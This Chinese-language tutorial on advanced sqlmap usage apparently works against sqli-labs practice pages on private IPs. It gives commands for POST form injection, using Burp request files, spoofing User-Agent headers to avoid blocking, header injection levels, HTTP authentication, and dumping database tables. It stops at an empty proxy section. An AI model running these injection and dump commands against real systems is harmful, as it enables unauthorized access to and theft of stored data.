### sqlmap 深入

####  1、POST提交参数

&ensp; 默认情况下，用于执行HTTP请求的HTTP方法是GET，但是可以通过提供在POST请求中发送的数据隐式地将其更改为POST。

##### 1.1、自动搜索表单注入

~~~makefile
sqlmap -u "http://172.17.149.241/sqli/Less-11/index.php" --forms	# 判断是否存在post注入
~~~

~~~makefile
sqlmap -u "http://172.17.149.241/sqli/Less-11/index.php" --forms --dbs # 查看数据库
~~~

~~~makefile
sqlmap -u "http://172.17.149.241/sqli/Less-11/index.php" --forms --current-db #查看当前库名
~~~

~~~makefile
sqlmap -u "http://172.17.149.241/sqli/Less-11/index.php" --forms -D 数据库名 --tables
	# 查看指定数据库的表名 
~~~

~~~makefile
sqlmap -u "http://172.17.149.241/sqli/Less-11/index.php" --forms -D 库名 -T 表名 --columns		# 查看指定列名
~~~

~~~makefile
sqlmap -u "http://172.17.149.241/sqli/Less-11/index.php" --forms -D 库名 -T 表名 -C 字段名1，字段名2 --dump	# 爆破数据
~~~



##### 1.2、指定表单注入

~~~makefile
sqlmap -u "http://172.17.149.241/sqli/Less-11/index.php" -- data="uname=asd&passwd=D&submit=Submit"  # 判断是否存在post注入
~~~

~~~makefile
sqlmap -u "http://172.17.149.241/sqli/Less-11/index.php" --data "uname=asd&passwd=D&submit=Submit" --dbs # 查看数据库
~~~

后续步骤相同。



##### 1.3、利用bp抓包。

&ensp; 利用 **bp** 抓包，将抓取的数据复制粘贴，保存为文本（txt）。 

~~~makefile
sqlmap -r '/home/123.txt'	# 判断是否存在注入点
~~~

~~~makefile
sqlmap -r '/home/123.txt' --dbs # 查看所有数据库
~~~

后续步骤相同。



#### 2、更改请求头

##### 2.1、设置 User-Agent 

&ensp; sqlmap 默认会自带`User-Agent` ,然而有些服务器会自动屏蔽这种请求头。所以这时就需要将`User_Agent`更改，让服务器认为这是符合要求的请求。

**指定具体的User-Agent**   参数：`--user_agent`  

~~~makefile
sqlmap -u "http://172.17.149.241/sqli/Less-1/?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" 
~~~



**自动生成User-Agent**  参数： `--random-agent`

本人（kali）的自动生成字典存放在`/usr/share/sqlmap/data/txt` 路径下

~~~makefile
sqlmap -u "http://172.17.149.241/sqli/Less-1/?id=1" --random-agent 
~~~



**探测User-Agent头是否存在注入** 参数： `--level 3`

~~~makefile
sqlmap -r sta1.txt --level 3 
~~~



##### 2.2、探测 host 和 Referer值

&ensp; 如果 `--level` 设置为 3 或以上，将针对HTTP引用头进行SQL注入测试。

~~~makefile
sqlmap -r sta1 --level 5
~~~



##### 3.3、设置额外的http头

&ensp; 通过设置选项`--header`，可以提供额外的HTTP表头。每个标头必须用换行符分隔。推荐使用更改配置文件`sqlmap.conf` 不易出错。

~~~makefile
# HTTP User-Agent header value. Useful to fake the HTTP User-Agent header value
# at each HTTP request.
# sqlmap will also test for SQL injection on the HTTP User-Agent value.
agent =

# Imitate smartphone through HTTP User-Agent header.
# Valid: True or False
mobile = False

# Use randomly selected HTTP User-Agent header value.
# Valid: True or False
randomAgent = False

# HTTP Host header value.
host = 

# HTTP Referer header. Useful to fake the HTTP Referer header value at
# each HTTP request.
referer = 

# Extra HTTP headers
headers = Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
 Accept-Language: en-us,en;q=0.5
 Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7

~~~



#### 3、设置HTTP协议认证

Sqlmap中设置HTTP协议认证的参数：`--auth-type`和`--auth-cred`

`--auth-type`支持：Basic、Digest、NTLM

`--auth-cred`认证语法为：username:password

~~~makefile
sqlmap -u "http://192.168.1.12/index.php?id=1" --auth-type Basic --auth-cred "admin:admin"
~~~



#### 4、设置代理

参数：







